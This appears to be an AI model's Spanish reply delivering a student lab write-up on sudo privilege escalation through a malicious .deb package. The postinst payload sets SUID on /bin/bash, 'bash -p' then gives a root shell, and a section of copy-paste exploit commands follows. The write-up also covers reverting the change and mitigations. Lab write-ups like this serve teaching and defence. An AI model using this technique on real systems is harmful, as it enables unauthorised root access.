Aquí tienes el documento Markdown completo y extenso sobre la **explotación con paquetes .deb**, incluyendo cómo lo hicimos y cómo lo deshicimos.

---

```markdown
# Explotación de Privilegios con Paquetes .deb - Laboratorio 2

**Autor:** Estudiante  
**Fecha:** 2026-05-17  
**Máquina víctima:** victim-3 (IP: 10.0.3.5)  
**Usuario inicial:** daguirre  
**Vulnerabilidad:** sudo sin contraseña para `dpkg` y `apt-get`

---

## Índice

1. [Detección de la vulnerabilidad](#1-detección-de-la-vulnerabilidad)
2. [Conceptos teóricos](#2-conceptos-teóricos)
3. [Explotación paso a paso](#3-explotación-paso-a-paso)
4. [Verificación del éxito](#4-verificación-del-éxito)
5. [Revertir el cambio (deshacer)](#5-revertir-el-cambio-deshacer)
6. [Explicación técnica detallada](#6-explicación-técnica-detallada)
7. [Comandos completos (para copiar)](#7-comandos-completos-para-copiar)
8. [Mitigación y buenas prácticas](#8-mitigación-y-buenas-prácticas)

---

## 1. Detección de la vulnerabilidad

### Comando utilizado:

```bash
daguirre@victim-3:~$ sudo -l
```

### Salida obtenida:

```
Matching Defaults entries for daguirre on victim-3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User daguirre may run the following commands on victim-3:
    (root) NOPASSWD: /usr/bin/dpkg, /usr/bin/apt-get
```

### Análisis de la vulnerabilidad:

| Elemento | Valor | Significado |
|----------|-------|-------------|
| Usuario | `daguirre` | El usuario afectado |
| Comandos | `/usr/bin/dpkg`, `/usr/bin/apt-get` | Puede ejecutar el gestor de paquetes |
| Privilegio | `(root) NOPASSWD:` | **Como root, SIN CONTRASEÑA** |

> ⚠️ **Esto es crítico:** Un usuario normal puede instalar paquetes con privilegios de superusuario.

---

## 2. Conceptos teóricos

### 2.1 ¿Qué es un paquete .deb?

Es el formato de paquete estándar en distribuciones Debian/Ubuntu. Contiene:
- Archivos del programa
- Metadatos (nombre, versión, dependencias)
- Scripts de instalación/desinstalación

### 2.2 Estructura de un paquete .deb

```
mi-paquete/
└── DEBIAN/
    ├── control      # Metadatos (obligatorio)
    ├── preinst      # Script antes de instalar (opcional)
    ├── postinst     # Script después de instalar (opcional)
    ├── prerm        # Script antes de desinstalar
    └── postrm       # Script después de desinstalar
```

### 2.3 Scripts postinst

Los scripts `postinst` se ejecutan **automáticamente con privilegios de root** después de instalar un paquete. Esto es lo que explotamos.

### 2.4 SUID (Set User ID)

Es un permiso especial en Linux que permite ejecutar un archivo con los privilegios de su propietario (generalmente root).

```bash
# Permiso SUID activado
-rwsr-xr-x   # La 's' en posición del owner indica SUID

# Permiso normal
-rwxr-xr-x   # Sin SUID
```

---

## 3. Explotación paso a paso

### 3.1 Crear la estructura del paquete malicioso

```bash
daguirre@victim-3:~$ mkdir -p /tmp/pwn/DEBIAN
```

### 3.2 Crear el archivo de control (metadatos)

```bash
daguirre@victim-3:~$ cat > /tmp/pwn/DEBIAN/control << 'EOF'
Package: pwn
Version: 1.0
Section: custom
Priority: optional
Architecture: all
Maintainer: root
Description: Privilege escalation package
EOF
```

**Explicación de cada campo:**

| Campo | Valor | Significado |
|-------|-------|-------------|
| `Package` | pwn | Nombre del paquete |
| `Version` | 1.0 | Versión |
| `Section` | custom | Categoría |
| `Priority` | optional | Prioridad de instalación |
| `Architecture` | all | Funciona en cualquier arquitectura |
| `Maintainer` | root | Mantenedor (podría ser cualquiera) |
| `Description` | ... | Descripción del paquete |

### 3.3 Crear el script postinst (el payload)

```bash
daguirre@victim-3:~$ cat > /tmp/pwn/DEBIAN/postinst << 'EOF'
#!/bin/bash
chmod 4777 /bin/bash
EOF
```

**Explicación del payload:**

```bash
#!/bin/bash        # Shebang - indica que se ejecuta con bash
chmod 4777 /bin/bash  # Cambia permisos:
                       # 4 = SUID
                       # 7 = rwx para owner
                       # 7 = rwx para grupo  
                       # 7 = rwx para otros
```

### 3.4 Dar permisos de ejecución

```bash
daguirre@victim-3:~$ chmod +x /tmp/pwn/DEBIAN/postinst
```

### 3.5 Construir el paquete .deb

```bash
daguirre@victim-3:~$ dpkg-deb --build /tmp/pwn /tmp/pwn.deb
```

**Salida esperada:**
```
dpkg-deb: building package 'pwn' in '/tmp/pwn.deb'.
```

### 3.6 Instalar el paquete como root (sin contraseña)

```bash
daguirre@victim-3:~$ sudo dpkg -i /tmp/pwn.deb
```

**Salida esperada:**
```
Selecting previously unselected package pwn.
(Reading database ... 65098 files and directories currently installed.)
Preparing to unpack /tmp/pwn.deb ...
Unpacking pwn (1.0) ...
Setting up pwn (1.0) ...
```

### 3.7 Verificar que el SUID se aplicó

```bash
daguirre@victim-3:~$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1396520 Jan  6  2022 /bin/bash
#  ↑ La 's' indica que SUID está activo
```

### 3.8 Obtener shell root

```bash
daguirre@victim-3:~$ bash -p
bash-5.1#
```

**¿Qué hace `-p`?**
El flag `-p` (privileged mode) le dice a bash que **no** baje los privilegios aunque se ejecute con SUID.

---

## 4. Verificación del éxito

```bash
bash-5.1# whoami
root

bash-5.1# id
uid=1003(daguirre) gid=1004(daguirre) euid=0(root) groups=1004(daguirre),1001(administrator)
#                                                                   ↑
#                                             Effective UID = 0 (root)

bash-5.1# cat /root/flag.txt
[CONTENIDO DE LA FLAG]
```

---

## 5. Revertir el cambio (deshacer)

### 5.1 ¿Por qué deshacerlo?

El SUID en `/bin/bash` es peligroso porque **cualquier usuario** puede ejecutar `bash -p` y obtener root. Debemos restaurar los permisos originales.

### 5.2 Crear un paquete de restauración

```bash
daguirre@victim-3:~$ mkdir -p /tmp/restore/DEBIAN
```

### 5.3 Archivo de control

```bash
daguirre@victim-3:~$ cat > /tmp/restore/DEBIAN/control << 'EOF'
Package: restore
Version: 1.0
Section: custom
Priority: optional
Architecture: all
Maintainer: root
Description: Restore bash permissions to original
EOF
```

### 5.4 Script postinst que RESTAURA

```bash
daguirre@victim-3:~$ cat > /tmp/restore/DEBIAN/postinst << 'EOF'
#!/bin/bash
chmod 755 /bin/bash
EOF
```

**Explicación de `chmod 755`:**
- `7` = rwx para owner (root)
- `5` = r-x para grupo
- `5` = r-x para otros

**Resultado:** `-rwxr-xr-x` (sin SUID)

### 5.5 Construir el paquete de restauración

```bash
daguirre@victim-3:~$ chmod +x /tmp/restore/DEBIAN/postinst
daguirre@victim-3:~$ dpkg-deb --build /tmp/restore /tmp/restore.deb
```

### 5.6 Instalar el paquete de restauración

```bash
daguirre@victim-3:~$ sudo dpkg -i /tmp/restore.deb
```

### 5.7 Verificar la restauración

```bash
daguirre@victim-3:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
#  ↑ La 's' ya no está. Permisos normales.
```

### 5.8 Verificar que ya no se puede escalar

```bash
daguirre@victim-3:~$ bash -p
daguirre@victim-3:~$ whoami
daguirre
# No se obtuvo root
```

### 5.9 Limpiar archivos temporales

```bash
daguirre@victim-3:~$ rm -rf /tmp/pwn /tmp/pwn.deb /tmp/restore /tmp/restore.deb
```

---

## 6. Explicación técnica detallada

### 6.1 ¿Por qué funciona?

```
1. daguirre ejecuta: sudo dpkg -i pwn.deb
                │
                ▼
2. El sistema ejecuta dpkg como root (por el sudo)
                │
                ▼
3. dpkg extrae el paquete y encuentra el script postinst
                │
                ▼
4. dpkg ejecuta postinst como root (así está diseñado)
                │
                ▼
5. postinst ejecuta: chmod 4777 /bin/bash
                │
                ▼
6. /bin/bash ahora tiene permisos SUID (se ejecuta como root)
                │
                ▼
7. daguirre ejecuta: bash -p
                │
                ▼
8. bash mantiene los privilegios efectivos (root)
```

### 6.2 Comparativa de permisos

| Comando | Permisos originales | Después del exploit |
|---------|--------------------|--------------------|
| `ls -la /bin/bash` | `-rwxr-xr-x` | `-rwsrwxrwx` |
| `bash -p` | Sigue siendo daguirre | **Se convierte en root** |
| `cat /root/flag.txt` | Permission denied | **Se puede leer** |

### 6.3 Comparativa de métodos (exploit vs restore)

| Elemento | Exploit (pwn) | Restore |
|----------|---------------|---------|
| **Directorio** | `/tmp/pwn/DEBIAN` | `/tmp/restore/DEBIAN` |
| **postinst** | `chmod 4777 /bin/bash` | `chmod 755 /bin/bash` |
| **Efecto** | Activa SUID | Desactiva SUID |
| **Resultado** | `-rwsrwxrwx` | `-rwxr-xr-x` |

---

## 7. Comandos completos (para copiar)

### 7.1 Explotación (todo de una vez)

```bash
# Crear paquete malicioso
mkdir -p /tmp/pwn/DEBIAN
echo "Package: pwn" > /tmp/pwn/DEBIAN/control
echo "Version: 1.0" >> /tmp/pwn/DEBIAN/control
echo "Architecture: all" >> /tmp/pwn/DEBIAN/control
echo '#!/bin/bash' > /tmp/pwn/DEBIAN/postinst
echo 'chmod 4777 /bin/bash' >> /tmp/pwn/DEBIAN/postinst
chmod +x /tmp/pwn/DEBIAN/postinst
dpkg-deb --build /tmp/pwn /tmp/pwn.deb
sudo dpkg -i /tmp/pwn.deb
bash -p
```

### 7.2 Restauración (todo de una vez)

```bash
# Restaurar permisos originales
mkdir -p /tmp/restore/DEBIAN
echo "Package: restore" > /tmp/restore/DEBIAN/control
echo "Version: 1.0" >> /tmp/restore/DEBIAN/control
echo "Architecture: all" >> /tmp/restore/DEBIAN/control
echo '#!/bin/bash' > /tmp/restore/DEBIAN/postinst
echo 'chmod 755 /bin/bash' >> /tmp/restore/DEBIAN/postinst
chmod +x /tmp/restore/DEBIAN/postinst
dpkg-deb --build /tmp/restore /tmp/restore.deb
sudo dpkg -i /tmp/restore.deb
rm -rf /tmp/pwn /tmp/pwn.deb /tmp/restore /tmp/restore.deb
```

---

## 8. Mitigación y buenas prácticas

### 8.1 Desde el punto de vista del administrador

**❌ Configuración vulnerable:**
```
daguirre ALL=(root) NOPASSWD: /usr/bin/dpkg, /usr/bin/apt-get
```

**✅ Configuración segura:**
- Opción 1: Requerir contraseña
  ```
  daguirre ALL=(root) /usr/bin/dpkg, /usr/bin/apt-get
  ```

- Opción 2: Eliminar estos comandos del sudoers
  ```
  # Comentar o eliminar la línea
  ```

- Opción 3: Usar grupos específicos
  ```
  %admin ALL=(root) /usr/bin/apt-get
  ```

### 8.2 Desde el punto de vista del programador

1. **No confiar en scripts postinst** de fuentes no verificadas
2. **Firmar paquetes** con GPG para garantizar autenticidad
3. **Usar contenedores** o entornos aislados para pruebas

### 8.3 Buenas prácticas generales

| Práctica | Descripción |
|----------|-------------|
| **Mínimo privilegio** | Solo dar permisos estrictamente necesarios |
| **Revisar sudoers** | `visudo -c` para validar sintaxis |
| **Auditoría** | Revisar regularmente `sudo -l` de todos los usuarios |
| **Logs** | Monitorear `/var/log/auth.log` para uso de sudo |

### 8.4 Comandos de verificación para administradores

```bash
# Listar todos los usuarios con sudo
grep -E "^[^:]+:.*:.*:.*:.*:/.*" /etc/passwd | while read line; do 
    user=$(echo $line | cut -d: -f1)
    echo "=== $user ===" 
    sudo -l -U $user 2>/dev/null
done

# Buscar NOPASSWD en sudoers
grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/
```

---

## 9. Resumen visual del ataque

```
┌─────────────────────────────────────────────────────────────────┐
│                    ESCALADA DE PRIVILEGIOS                       │
│                  (daguirre → root)                               │
└─────────────────────────────────────────────────────────────────┘

    daguirre                      sistema                        root
       │                             │                             │
       │  sudo -l                    │                             │
       │────────────────────────────►│                             │
       │                             │                             │
       │  (root) NOPASSWD: dpkg      │                             │
       │◄────────────────────────────│                             │
       │                             │                             │
       │  sudo dpkg -i pwn.deb       │                             │
       │────────────────────────────►│                             │
       │                             │  ejecuta postinst           │
       │                             │────────────────────────────►│
       │                             │                             │
       │                             │  chmod 4777 /bin/bash       │
       │                             │◄────────────────────────────│
       │                             │                             │
       │  SUID activado en /bin/bash │                             │
       │◄────────────────────────────│                             │
       │                             │                             │
       │  bash -p                    │                             │
       │────────────────────────────►│                             │
       │                             │                             │
       │  shell root (euid=0)        │                             │
       │◄────────────────────────────│                             │
       │                             │                             │
       │  cat /root/flag.txt         │                             │
       │─────────────────────────────────────────────────────────►│
       │                                                          │
       │  FLAG                                                    
       │◄─────────────────────────────────────────────────────────│
```

---

## 10. Conclusión

La vulnerabilidad encontrada permite a un usuario sin privilegios ejecutar `dpkg` como root, lo que facilita la instalación de paquetes maliciosos. Los scripts `postinst` de dichos paquetes se ejecutan con privilegios elevados, permitiendo:

1. Activar SUID en `/bin/bash`
2. Obtener una shell root con `bash -p`
3. Acceder a cualquier archivo del sistema (incluyendo `/root/flag.txt`)

La restauración se logra instalando un segundo paquete que revierte los permisos de `/bin/bash` a su estado original (`755`).

---

*Documento generado durante el Laboratorio 2 - Fundamentos de Seguridad Informática*
```

---

¿Necesitas que agregue algo más? ¿O continuamos con la **Parte 3** (configuración de políticas de contraseñas con PAM)?